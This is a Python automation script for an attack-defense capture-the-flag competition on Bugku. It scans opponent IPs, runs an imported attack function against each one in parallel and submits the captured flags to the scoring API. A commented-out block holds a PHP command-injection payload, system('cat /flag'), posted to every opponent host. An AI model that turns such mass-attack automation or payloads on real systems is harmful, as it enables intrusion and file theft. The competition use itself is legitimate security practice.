import time
import os
from multiprocessing import Pool
import fast_ping
import requests
from attack_script import attack

# print(flag_list)

class Init():           # 这个类用来初始化信息
    def __init__(self):
        with open("info/api.txt", "w") as f:
            f.write(
                input('Input your api (such as: https://ctf.bugku.com/pvp/submit.html?token=[token]&flag=[flag]): '))
            f.write('\n')
        with open("info/attack_address.txt", "w") as f:
            url = input('Input your enemy\'s url (such as: 192-168-1-X.pvp4151.bugku.cn): ')
            f.write(url)
            f.write('\n')
        with open("info/token.txt", "w") as f:
            f.write(input('Input your token (such as: 6c8034d275d12042e9e20180871febfa): '))
            f.write('\n')
        print(url)
        fast_ping.main_function_to_execute(url)


class Config():         # 这个类用来读取信息
    def __init__(self):
        pass

    def read_alive_ips(self):
        with open('info/alive_ips.txt', 'r') as f:
            alive_ips = [line.strip() for line in f.readlines()]
        return alive_ips

    def read_api(self):
        with open('info/api.txt', 'r') as f:
            api = f.readline().strip()
        return api

    def read_token(self):
        with open('info/token.txt', 'r') as f:
            token = f.readline().strip()
        return token

    def read_attack_address(self):
        with open('info/attack_address.txt', 'r') as f:
            attack_address = f.readline().strip()
        return attack_address


def submit(array:tuple):    # 这个函数用来单进程提交flag
    flag = array[0]
    api = array[1].replace('[','{').replace(']','}')
    token = array[2]
    url = api.format(token=token, flag=flag)
    res = requests.get(url)
    print(res.text)

def attack_and_submit(ip:str):
    try:
        flag = attack(ip)
        print('\033[92m'+flag+'\033[0m')
        submit((flag,api,token))
    except:
        print('\033[31mIP:\033[0m',ip,'\033[31mattack failed!\033[0m')

if __name__ == '__main__':
    # 先是初始化信息部分
    try:
        make_time = os.path.getmtime("info/token.txt")  # 修改时间
        if time.time() - make_time > 86400:  # 如果上个文件修改时间超过1600000秒，则重新初始化
            print('\033[93mWarning: \033[0mThere has been a file but too old, start init')
            Init()
        else:
            print('\033[93mWarning: \033[0mThere has been a file named token.txt ')
    except FileNotFoundError:
        print('\033[93mFile not found\033[0m, start init')
        Init()  # 如果不存在这个文件，则初始化
    # except:
    #     print('\033[31mSomething bad happened!!!!\033[0m')
    # 文件初始化结束，下面是读取信息部分
    api = Config().read_api()
    token = Config().read_token()
    attack_address = Config().read_attack_address()
    alive_ips = Config().read_alive_ips()
    if len(alive_ips) <=1:
        print('\033[31mWarning: \033[0mThere is only one ip alive, scaning again!')
        fast_ping.main_function_to_execute(attack_address)
    print('\033[31mConfirm you information: \033[0m\n', 'api:', api, '\n', 'token:', token, '\n', 'alive_ips:', alive_ips, '\n',
          'attack_address:', attack_address, '\n')
    print('Your enemy:', alive_ips,sep = '\n')

    with Pool(processes=32) as pool:  # 根据需要设置进程数!!!!!!!
        flag_list = pool.map(attack_and_submit, alive_ips)
    flag_list = [flag for flag in flag_list if flag is not None]

    # for i in alive_ips:
    #     try:
    #         data = {'a': 'system(\'cat /flag\');'}
    #         res = requests.post(i,params="a=system('cat /flag');")
    #         print(res.text)
    #         print('get!')
    #         # flag_list.append(res.text)
    #         flag =
    #         submit((res.text,api,token))
    #     except:
    #         pass
    # 下面是提交flag部分

    if flag_list and api and token:
        with Pool(processes=32) as pool:  # 根据需要设置进程数!!!!!!!
            alive_ips = pool.map(submit, (flag_list, [api for _ in flag_list], [token for _ in flag_list]))
    else:
        print('Man! Where is your flag?')
